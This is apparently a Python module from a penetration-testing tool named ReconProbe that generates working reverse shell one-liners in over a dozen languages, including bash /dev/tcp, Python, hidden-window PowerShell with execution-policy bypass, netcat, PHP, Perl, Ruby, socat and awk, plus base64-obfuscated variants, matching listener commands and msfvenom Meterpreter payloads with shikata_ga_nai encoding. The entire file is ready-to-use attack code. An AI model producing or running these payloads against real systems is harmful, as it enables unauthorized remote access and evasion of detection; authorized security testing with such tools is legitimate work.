"""Reverse shell & payload generator for ReconProbe.

Generates one-liner reverse shell payloads across multiple languages/formats
with optional encoding/obfuscation and listener command output.
"""

from __future__ import annotations

import asyncio
import base64
import re
import subprocess
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class Payload:
    """A generated payload with execution command and listener instructions."""
    type: str  # python, bash, powershell, netcat, php, perl, ruby, msfvenom
    command: str
    listener_command: str
    encoded: bool = False
    encoded_command: Optional[str] = None
    lhost: str = "127.0.0.1"
    lport: int = 4444
    description: Optional[str] = None


@dataclass
class PayloadReport:
    """Collection of generated payloads for a target."""
    target: str
    payloads: list[Payload] = field(default_factory=list)
    lhost: str = "127.0.0.1"
    lport: int = 4444
    encode_available: bool = False
    msfvenom_available: bool = False

    @property
    def total(self) -> int:
        """Total number of payloads."""
        return len(self.payloads)

    def by_type(self, payload_type: str) -> list[Payload]:
        """Filter payloads by type."""
        return [p for p in self.payloads if p.type == payload_type]


def _nc_listener(lport: int) -> str:
    return f"nc -lvnp {lport}"


def _rlwrap_listener(lport: int) -> str:
    return f"rlwrap nc -lvnp {lport}"


def _ncat_listener(lport: int) -> str:
    return f"ncat -lvnp {lport}"


def generate_bash_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a bash reverse shell one-liner."""
    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    listener = _nc_listener(lport)

    if encode:
        b64 = base64.b64encode(cmd.encode()).decode()
        encoded_cmd = f"echo '{b64}' | base64 -d | bash"
        return Payload(
            type="bash", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Bash reverse shell via /dev/tcp",
        )
    return Payload(
        type="bash", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Bash reverse shell via /dev/tcp",
    )


def generate_python_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Python reverse shell one-liner."""
    code = (
        f'import socket,subprocess,os;'
        f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        f's.connect(("{lhost}",{lport}));'
        f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
        f'p=subprocess.call(["/bin/sh","-i"])'
    )
    cmd = f"python3 -c '{code}'"
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode()).decode()
        encoded_cmd = f"python3 -c \"import base64,sys;exec(base64.b64decode('{b64}'))\""
        return Payload(
            type="python", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Python reverse shell",
        )
    return Payload(
        type="python", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Python reverse shell",
    )


def generate_python3_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Python3 reverse shell one-liner (short variant)."""
    code = (
        f'import os,socket,subprocess;'
        f's=socket.socket();'
        f's.connect(("{lhost}",{lport}));'
        f'[os.dup2(s.fileno(),x) for x in range(3)];'
        f'subprocess.call(["/bin/sh","-i"])'
    )
    cmd = f"python3 -c '{code}'"
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode()).decode()
        encoded_cmd = f"python3 -c \"import base64,sys;exec(base64.b64decode('{b64}'))\""
        return Payload(
            type="python", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Python3 short reverse shell",
        )
    return Payload(
        type="python", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Python3 short reverse shell",
    )


def generate_powershell_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a PowerShell reverse shell one-liner."""
    code = (
        f'$client=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});'
        f'$stream=$client.GetStream();'
        f'[byte[]]$bytes=0..65535|%{{0}};'
        f'while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;'
        f'$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
        f'$sendback=(iex $data 2>&1 | Out-String );'
        f'$sendback2=$sendback+"PS "+(pwd).Path+"> ";'
        f'$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);'
        f'$stream.Write($sendbyte,0,$sendbyte.Length);'
        f'$stream.Flush()}};'
        f'$client.Close()'
    )
    cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "{code}"'
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode("utf-16le")).decode()
        encoded_cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'
        return Payload(
            type="powershell", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="PowerShell reverse shell (base64 encoded)",
        )
    return Payload(
        type="powershell", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="PowerShell reverse shell",
    )


def generate_netcat_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate Netcat reverse shell variants."""
    cmd = f"nc -e /bin/sh {lhost} {lport}"
    listener = _nc_listener(lport)

    if encode:
        # Base64 encode the nc command
        b64 = base64.b64encode(cmd.encode()).decode()
        encoded_cmd = f"echo '{b64}' | base64 -d | bash"
        return Payload(
            type="netcat", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Netcat reverse shell (-e flag)",
        )
    return Payload(
        type="netcat", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Netcat reverse shell (-e flag)",
    )


def generate_php_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a PHP reverse shell one-liner."""
    code = (
        f'$sock=fsockopen("{lhost}",{lport});'
        f'exec("/bin/sh -i <&3 >&3 2>&3")'
    )
    cmd = f"php -r '{code}'"
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode()).decode()
        encoded_cmd = f"php -r \"eval(base64_decode('{b64}'))\""
        return Payload(
            type="php", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="PHP reverse shell",
        )
    return Payload(
        type="php", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="PHP reverse shell",
    )


def generate_perl_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Perl reverse shell one-liner."""
    code = (
        f'use Socket;'
        f'$i="{lhost}";$p={lport};'
        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
        f'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
        f'exec("/bin/sh -i");}}'
    )
    cmd = f"perl -e '{code}'"
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode()).decode()
        encoded_cmd = f"perl -e \"use MIME::Base64;eval(decode_base64('{b64}'))\""
        return Payload(
            type="perl", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Perl reverse shell",
        )
    return Payload(
        type="perl", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Perl reverse shell",
    )


def generate_ruby_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Ruby reverse shell one-liner."""
    code = (
        f'require "socket";'
        f'c=TCPSocket.new("{lhost}",{lport});'
        f'$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);'
        f'$stdin.each_line{{|l|l=l.strip;next if l.length==0;'
        f'(IO.popen(l,"rb"){{|io|io.each_line{{|io_l|c.puts io_l.strip}}}}) rescue nil}}'
    )
    cmd = f"ruby -e '{code}'"
    listener = _rlwrap_listener(lport)

    if encode:
        b64 = base64.b64encode(code.encode()).decode()
        encoded_cmd = f"ruby -e \"require 'base64';eval(Base64.decode64('{b64}'))\""
        return Payload(
            type="ruby", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Ruby reverse shell",
        )
    return Payload(
        type="ruby", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Ruby reverse shell",
    )


def generate_ncat_ssl_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate an Ncat SSL reverse shell."""
    cmd = f"ncat --ssl {lhost} {lport} -e /bin/sh"
    listener = f"ncat --ssl -lvnp {lport}"

    if encode:
        b64 = base64.b64encode(cmd.encode()).decode()
        encoded_cmd = f"echo '{b64}' | base64 -d | bash"
        return Payload(
            type="netcat", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Ncat SSL-encrypted reverse shell (base64)",
        )
    return Payload(
        type="netcat", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Ncat SSL-encrypted reverse shell",
    )


def generate_socat_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Socat reverse shell."""
    cmd = f"socat EXEC:/bin/sh TCP:{lhost}:{lport}"
    listener = f"socat TCP-LISTEN:{lport},reuseaddr,fork -"

    if encode:
        b64 = base64.b64encode(cmd.encode()).decode()
        encoded_cmd = f"echo '{b64}' | base64 -d | bash"
        return Payload(
            type="socat", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="Socat reverse shell (base64)",
        )
    return Payload(
        type="socat", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Socat reverse shell",
    )


def generate_awk_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate an AWK reverse shell."""
    code = (
        f'BEGIN {{s="/inet/tcp/0/{lhost}/{lport}";'
        f'while(42|getline){{print $0|&s;close(s)}};}}'
    )
    cmd = f"awk '{code}'"
    listener = _nc_listener(lport)

    if encode:
        b64 = base64.b64encode(cmd.encode()).decode()
        encoded_cmd = f"echo '{b64}' | base64 -d | bash"
        return Payload(
            type="awk", command=cmd, listener_command=listener,
            encoded=True, encoded_command=encoded_cmd,
            lhost=lhost, lport=lport,
            description="AWK reverse shell (base64)",
        )
    return Payload(
        type="awk", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="AWK reverse shell",
    )


def generate_telnet_reverse_shell(lhost: str, lport: int, encode: bool = False) -> Payload:
    """Generate a Telnet reverse shell two-liner."""
    cmd = f"rm -f /tmp/b; mknod /tmp/b p; telnet {lhost} {lport} 0</tmp/b | /bin/sh 1>/tmp/b"
    listener = _nc_listener(lport)
    return Payload(
        type="telnet", command=cmd, listener_command=listener,
        lhost=lhost, lport=lport,
        description="Telnet reverse shell (requires mknod)",
    )


async def try_msfvenom_generate(
    payload_type: str,
    lhost: str,
    lport: int,
    encode: bool = False,
    timeout: float = 15.0,
) -> Optional[Payload]:
    """Try to generate a payload using msfvenom (if installed)."""
    try:
        # Map payload types to msfvenom payload names
        payload_map = {
            "linux_x64": "linux/x64/shell_reverse_tcp",
            "linux_x86": "linux/x86/shell_reverse_tcp",
            "windows": "windows/shell_reverse_tcp",
            "windows_x64": "windows/x64/shell_reverse_tcp",
            "macos": "osx/x64/shell_reverse_tcp",
            "android": "android/meterpreter/reverse_tcp",
            "php_msf": "php/meterpreter_reverse_tcp",
            "python_msf": "python/meterpreter_reverse_tcp",
            "asp": "windows/meterpreter/reverse_tcp",
            "jsp": "java/jsp_shell_reverse_tcp",
            "war": "java/shell_reverse_tcp",
        }

        if payload_type not in payload_map:
            return None

        msf_payload = payload_map[payload_type]
        encoder_arg = ["-e", "x86/shikata_ga_nai", "-i", "5"] if encode else []

        cmd = [
            "msfvenom",
            "-p", msf_payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            *encoder_arg,
        ]

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)

        if proc.returncode == 0 and stdout:
            # Generate the listener command
            listener = f"msfconsole -q -x 'use multi/handler; set PAYLOAD {msf_payload}; set LHOST {lhost}; set LPORT {lport}; exploit'"
            return Payload(
                type="msfvenom",
                command=f"msfvenom -p {msf_payload} LHOST={lhost} LPORT={lport} -f raw{' -e x86/shikata_ga_nai -i 5' if encode else ''}",
                listener_command=listener,
                encoded=encode,
                lhost=lhost, lport=lport,
                description=f"MSFVenom {payload_type} reverse shell",
            )
    except (FileNotFoundError, asyncio.TimeoutError, subprocess.TimeoutExpired):
        pass
    except Exception:
        pass
    return None


async def generate_payload(
    payload_type: str,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    encode: bool = False,
) -> Optional[Payload]:
    """Generate a reverse shell payload of the specified type.

    Args:
        payload_type: One of: auto, python, bash, powershell, netcat, php, perl, ruby,
                      socat, ncat-ssl, awk, telnet, msfvenom
        lhost: Local host IP for the reverse connection.
        lport: Local port for the reverse connection.
        encode: If True, generate an additional encoded/obfuscated variant.

    Returns:
        A Payload object or None if type is unknown.
    """
    generators = {
        "python": generate_python_reverse_shell,
        "python3": generate_python3_reverse_shell,
        "bash": generate_bash_reverse_shell,
        "sh": generate_bash_reverse_shell,
        "powershell": generate_powershell_reverse_shell,
        "ps": generate_powershell_reverse_shell,
        "netcat": generate_netcat_reverse_shell,
        "nc": generate_netcat_reverse_shell,
        "php": generate_php_reverse_shell,
        "perl": generate_perl_reverse_shell,
        "ruby": generate_ruby_reverse_shell,
        "socat": generate_socat_reverse_shell,
        "ncat-ssl": generate_ncat_ssl_reverse_shell,
        "awk": generate_awk_reverse_shell,
        "telnet": generate_telnet_reverse_shell,
    }

    if payload_type == "msfvenom":
        return await try_msfvenom_generate("linux_x64", lhost, lport, encode)

    gen = generators.get(payload_type)
    if gen:
        return gen(lhost, lport, encode)
    return None


async def generate_all_payloads(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    encode: bool = False,
    try_msfvenom: bool = False,
) -> PayloadReport:
    """Generate all available reverse shell payloads.

    Args:
        lhost: Local host IP.
        lport: Local port.
        encode: Generate encoded variants.
        try_msfvenom: If True, attempt msfvenom generation.

    Returns:
        A PayloadReport containing all generated payloads.
    """
    types = ["bash", "python", "python3", "powershell", "netcat", "php", "perl", "ruby",
             "socat", "ncat-ssl", "awk", "telnet"]

    payloads: list[Payload] = []
    for pt in types:
        p = await generate_payload(pt, lhost, lport, encode)
        if p:
            payloads.append(p)

    if try_msfvenom:
        msf = await try_msfvenom_generate("linux_x64", lhost, lport, encode)
        if msf:
            payloads.append(msf)

    return PayloadReport(
        target="",
        payloads=payloads,
        lhost=lhost,
        lport=lport,
        encode_available=encode,
        msfvenom_available=try_msfvenom,
    )
